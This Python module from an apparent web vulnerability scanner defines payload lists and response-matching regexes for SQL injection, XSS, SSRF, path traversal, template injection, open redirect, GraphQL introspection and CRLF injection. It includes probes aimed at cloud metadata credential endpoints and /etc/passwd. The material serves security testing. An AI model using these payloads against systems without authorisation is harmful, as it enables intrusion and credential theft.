"""Payload sets and response matchers for each vulnerability class."""

import re

# Each vuln class has:
#   payloads: list of test strings to inject
#   matchers: list of (pattern, confidence, description) to check in response
#   baseline_diff: what kind of response change indicates a hit


SQLI = {
    "name": "SQL Injection",
    "short": "sqli",
    "payloads": [
        # Error-based
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1; SELECT 1--",
        # Blind boolean
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        # Time-based
        "1' AND SLEEP(3)--",
        "1'; WAITFOR DELAY '0:0:3'--",
        "1' AND pg_sleep(3)--",
        # NoSQL
        '{"$gt":""}',
        '{"$ne":""}',
        "[$ne]=1",
    ],
    "matchers": [
        (re.compile(r"(?:SQL syntax|mysql_fetch|ORA-\d{5}|PG::SyntaxError|sqlite3\.OperationalError|SQLSTATE|sql error|syntax error.*SQL|unterminated quoted string|pg_query|mysql_|Unclosed quotation mark)", re.I),
         "high", "SQL error in response"),
        (re.compile(r"(?:You have an error in your SQL|check the manual that corresponds|near \".*\" at line \d)", re.I),
         "high", "MySQL error message"),
        (re.compile(r"(?:PostgreSQL.*ERROR|ERROR:\s+syntax error at or near)", re.I),
         "high", "PostgreSQL error message"),
        (re.compile(r"(?:Microsoft OLE DB|ODBC SQL Server|SQLServer JDBC|com\.microsoft\.sqlserver)", re.I),
         "high", "MSSQL error message"),
    ],
    "time_threshold_ms": 2500,
}

XSS = {
    "name": "Cross-Site Scripting",
    "short": "xss",
    "payloads": [
        # Reflection probes (unique markers)
        "wbprb<>\"'`test",
        "<script>alert('wbprb')</script>",
        '"><img src=x onerror=alert("wbprb")>',
        "'-alert('wbprb')-'",
        "javascript:alert('wbprb')",
        "<svg/onload=alert('wbprb')>",
        "{{7*7}}",  # template injection check
        "${7*7}",
        "<img src=x onerror=alert(1)>",
        "' autofocus onfocus=alert(1) '",
        '"><svg onload=alert(1)>',
    ],
    "matchers": [
        (re.compile(r"wbprb<>\"'`test"), "high", "Full probe string reflected unescaped"),
        (re.compile(r"<script>alert\('wbprb'\)</script>"), "high", "Script tag reflected unescaped"),
        (re.compile(r'onerror=alert\("wbprb"\)'), "high", "Event handler reflected"),
        (re.compile(r"alert\('wbprb'\)"), "medium", "Alert payload reflected"),
        (re.compile(r"wbprb"), "low", "Probe marker reflected (may be encoded)"),
        (re.compile(r"49"), "low", "Template expression evaluated (7*7=49)"),  # SSTI
    ],
    "time_threshold_ms": None,
}

SSRF = {
    "name": "Server-Side Request Forgery",
    "short": "ssrf",
    "payloads": [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://[::1]",
        "http://0x7f000001",
        "http://0177.0.0.1",
        "http://2130706433",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ],
    "matchers": [
        (re.compile(r"root:.*:0:0:", re.I), "high", "/etc/passwd content returned"),
        (re.compile(r"(?:iam|security-credentials|AccessKeyId|SecretAccessKey)", re.I),
         "high", "AWS metadata response"),
        (re.compile(r"(?:computeMetadata|instance/attributes)", re.I),
         "high", "GCP metadata response"),
        (re.compile(r"(?:localhost|127\.0\.0\.1).*(?:html|title|body)", re.I),
         "medium", "Localhost page content returned"),
        (re.compile(r"(?:Connection refused|Connection reset|No route to host)", re.I),
         "low", "Internal connection error (confirms server-side fetch)"),
    ],
    "time_threshold_ms": None,
}

LFI = {
    "name": "Local File Inclusion / Path Traversal",
    "short": "lfi",
    "payloads": [
        "../../etc/passwd",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\....\\windows\\win.ini",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd",
        "%00",
        "..%00",
    ],
    "matchers": [
        (re.compile(r"root:.*:0:0:"), "high", "/etc/passwd content"),
        (re.compile(r"\[fonts\]|\[extensions\]", re.I), "high", "win.ini content"),
        (re.compile(r"(?:DOCUMENT_ROOT|SERVER_SOFTWARE|HTTP_HOST)", re.I),
         "high", "/proc/self/environ content"),
        (re.compile(r"(?:No such file|Permission denied|open_basedir restriction)", re.I),
         "low", "File access error (confirms path processing)"),
    ],
    "time_threshold_ms": None,
}

SSTI = {
    "name": "Server-Side Template Injection",
    "short": "ssti",
    "payloads": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{7*7}",
        "{{config}}",
        "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime()}",
        "{{request.application.__globals__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{% debug %}",
        "{{dump(app)}}",
        "{{_self.env.getFilter('system')}}",
    ],
    "matchers": [
        (re.compile(r"(?<!\d)49(?!\d)"), "medium", "7*7=49 evaluated"),
        (re.compile(r"(?:__class__|__mro__|__subclasses__|__globals__)", re.I),
         "high", "Python object internals exposed"),
        (re.compile(r"(?:java\.lang\.Runtime|ProcessBuilder)", re.I),
         "high", "Java runtime access"),
        (re.compile(r"(?:SECRET_KEY|SQLALCHEMY|DEBUG.*True)", re.I),
         "high", "Config/secrets leaked via template"),
    ],
    "time_threshold_ms": None,
}

OPEN_REDIRECT = {
    "name": "Open Redirect",
    "short": "redirect",
    "payloads": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com%23",
        "https://evil.com%00",
        "////evil.com",
        "https:evil.com",
        "http://evil.com@legitimate.com",
        "/redirect?url=https://evil.com",
    ],
    "matchers": [
        # Check Location header in response (handled by detect.py)
    ],
    "time_threshold_ms": None,
    "check_redirect": True,
}

IDOR = {
    "name": "Insecure Direct Object Reference",
    "short": "idor",
    "payloads": [
        # These are dynamic - generated from discovered param values
        # The engine swaps IDs: if id=5, try id=1, id=6, id=0, id=-1, id=999999
    ],
    "id_mutations": [0, 1, -1, 2, 999999, 100],
    "matchers": [],  # Comparison-based: different data = possible IDOR
    "time_threshold_ms": None,
}

GRAPHQL_INTROSPECTION = {
    "name": "GraphQL Introspection",
    "short": "graphql",
    "payloads": [
        '{"query":"{ __schema { types { name fields { name type { name } } } } }"}',
        '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind } } }"}',
        '{"query":"{ __type(name: \\"Query\\") { name fields { name args { name type { name } } type { name } } } }"}',
    ],
    "matchers": [
        (re.compile(r"__schema|__type|queryType|mutationType", re.I),
         "high", "GraphQL introspection enabled"),
        (re.compile(r'"types"\s*:\s*\[', re.I),
         "high", "Schema types returned"),
    ],
    "time_threshold_ms": None,
}

HEADER_INJECTION = {
    "name": "Header Injection / CRLF",
    "short": "crlf",
    "payloads": [
        "test%0d%0aX-Injected: true",
        "test\r\nX-Injected: true",
        "test%0aSet-Cookie: wbprb=1",
        "%0d%0aLocation: https://evil.com",
    ],
    "matchers": [
        # Check response headers for injected header
    ],
    "time_threshold_ms": None,
    "check_headers": True,
}

# All vuln classes in priority order
ALL_CLASSES = [SQLI, XSS, SSRF, LFI, SSTI, OPEN_REDIRECT, GRAPHQL_INTROSPECTION, HEADER_INJECTION]

# Quick subset for fast scans
FAST_CLASSES = [SQLI, XSS, LFI, SSTI]


def get_class(name: str) -> dict:
    """Get a vuln class by short name."""
    for cls in ALL_CLASSES:
        if cls["short"] == name:
            return cls
    return None


def get_params_for_fuzzing(params: list[dict]) -> list[dict]:
    """Prioritize parameters most likely to be injectable."""
    priority_names = {
        "id", "user", "uid", "username", "email", "name", "search", "query", "q",
        "file", "path", "dir", "page", "url", "redirect", "next", "return", "goto",
        "callback", "ref", "src", "dest", "target", "uri", "continue",
        "cmd", "exec", "command", "action", "type", "template", "lang",
        "sort", "order", "column", "field", "filter", "category",
        "token", "key", "api_key", "session", "auth",
    }
    high = [p for p in params if p.get("name", "").lower() in priority_names]
    rest = [p for p in params if p.get("name", "").lower() not in priority_names]
    return high + rest
